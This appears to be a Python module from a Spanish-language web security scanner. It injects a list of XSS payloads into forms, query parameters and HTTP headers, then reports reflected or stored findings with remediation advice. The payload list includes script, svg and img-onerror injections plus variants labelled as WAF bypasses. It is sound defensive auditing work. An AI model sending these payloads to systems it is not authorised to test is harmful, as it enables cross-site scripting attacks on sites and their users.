from bs4 import BeautifulSoup
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from scanner.http_client import HttpClient
from scanner.forms import extract_forms_from_html


logger = logging.getLogger(__name__)


# Marcador único de auditoría
XSS_MARKER = "bh_xss_9r4k"

XSS_PAYLOADS = [
    # Básicos con marcador auditable
    f'"><{XSS_MARKER}>',
    f"'><{XSS_MARKER}>",
    f"<{XSS_MARKER}>",
    # Script clásico
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # WAF bypass: case mixing y espacios alternativos
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script/x>alert(1)</script>",
    # SVG y eventos
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    # Event handlers en atributos
    '" onmouseover="alert(1)',
    "' onfocus='alert(1)' autofocus='",
    # href javascript
    "javascript:alert(1)",
    # Doble codificación
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    # Template literal
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    # Blind XSS: payload que tarda en reflejarse (stored)
    f'<img src=x onerror="/*{XSS_MARKER}_blind*/">',
]

# Cabeceras que pueden reflejarse en la respuesta
REFLECTIVE_HEADERS = [
    ("Referer",    f"<{XSS_MARKER}>"),
    ("X-Forwarded-For", f"<{XSS_MARKER}>"),
    ("User-Agent", f"<{XSS_MARKER}>"),
]


def submit_form(client, form, payload):
    data = {}

    for field in form["fields"]:
        name = field["name"]
        field_type = field["type"]

        if field_type in ["submit", "button", "reset", "file"]:
            continue

        if field_type == "hidden":
            data[name] = field["value"]
        else:
            data[name] = payload

    if form["method"] == "POST":
        return client.post(form["action"], data=data)

    return client.get(form["action"], params=data)


def test_query_params(client, url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return None

    mutated = {k: payload for k in params.keys()}
    new_query = urlencode(mutated, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))

    return client.get(test_url)


def scan_reflected_xss_pages(pages, max_payloads=None):
    client = HttpClient()
    results = []
    payloads = XSS_PAYLOADS

    if max_payloads is not None:
        payloads = payloads[:max_payloads]

    for page in pages:
        page_url  = page.get("url") or page.get("final_url") or ""
        page_html = page.get("html") or page.get("rendered_html") or ""
        if not page_url:
            continue
        forms = extract_forms_from_html(page_url, page_html)

        for form in forms:
            for payload in payloads:
                try:
                    response = submit_form(client, form, payload)

                    if payload in (response.text or ""):
                        results.append({
                            "control": f"XSS reflejado - formulario {form['index']}",
                            "status": "Posible hallazgo",
                            "severity": "Alta",
                            "description": "Entrada reflejada sin neutralización evidente.",
                            "evidence": f"URL: {form['action']} | Payload reflejado: {payload}",
                            "recommendation": "Aplicar codificación de salida contextual, sanitización y CSP restrictiva."
                        })
                        break

                    # Blind/Stored hint: check for partial marker
                    if XSS_MARKER in (response.text or ""):
                        results.append({
                            "control": f"XSS potencialmente almacenado - formulario {form['index']}",
                            "status": "Posible hallazgo",
                            "severity": "Alta",
                            "description": "Marcador de auditoría presente en respuesta. Puede ser XSS stored si aparece en otra URL.",
                            "evidence": f"URL: {form['action']} | Marcador: {XSS_MARKER}",
                            "recommendation": "Verificar si el marcador aparece en otras rutas; si así es, es XSS almacenado."
                        })
                        break

                except Exception as exc:
                    results.append({
                        "control": "XSS reflejado",
                        "status": "Error",
                        "severity": "Media",
                        "description": "Error durante prueba XSS controlada.",
                        "evidence": str(exc),
                        "recommendation": "Revisar conectividad y comportamiento del formulario."
                    })

        for payload in payloads:
            try:
                response = test_query_params(client, page_url, payload)

                if response and (payload in (response.text or "") or XSS_MARKER in (response.text or "")):
                    results.append({
                        "control": "XSS reflejado - parámetro GET",
                        "status": "Posible hallazgo",
                        "severity": "Alta",
                        "description": "Parámetro GET reflejado en la respuesta.",
                        "evidence": f"URL: {page_url} | Payload reflejado: {payload}",
                        "recommendation": "Codificar salida, validar parámetros y aplicar CSP."
                    })
                    break

            except Exception:
                logger.debug("Fallo en prueba XSS GET", exc_info=True)

        # Header injection XSS
        for header_name, header_payload in REFLECTIVE_HEADERS:
            try:
                response = client.get(page_url, headers={header_name: header_payload})
                if XSS_MARKER in (response.text or ""):
                    results.append({
                        "control": f"XSS por cabecera HTTP: {header_name}",
                        "status": "Posible hallazgo",
                        "severity": "Media",
                        "description": f"El valor de la cabecera {header_name} se refleja sin codificar en la respuesta.",
                        "evidence": f"URL: {page_url} | Cabecera: {header_name}: {header_payload}",
                        "recommendation": "No reflejar cabeceras HTTP en respuestas sin codificación contextual."
                    })
            except Exception:
                logger.debug("Fallo en prueba XSS por cabeceras", exc_info=True)

    if not results:
        results.append({
            "control": "XSS reflejado",
            "status": "No evidenciado",
            "severity": "Informativa",
            "description": "No se detectó reflejo directo de payloads controlados.",
            "evidence": "Sin reflejo identificado.",
            "recommendation": "Complementar con pruebas autenticadas y revisión manual."
        })

    return results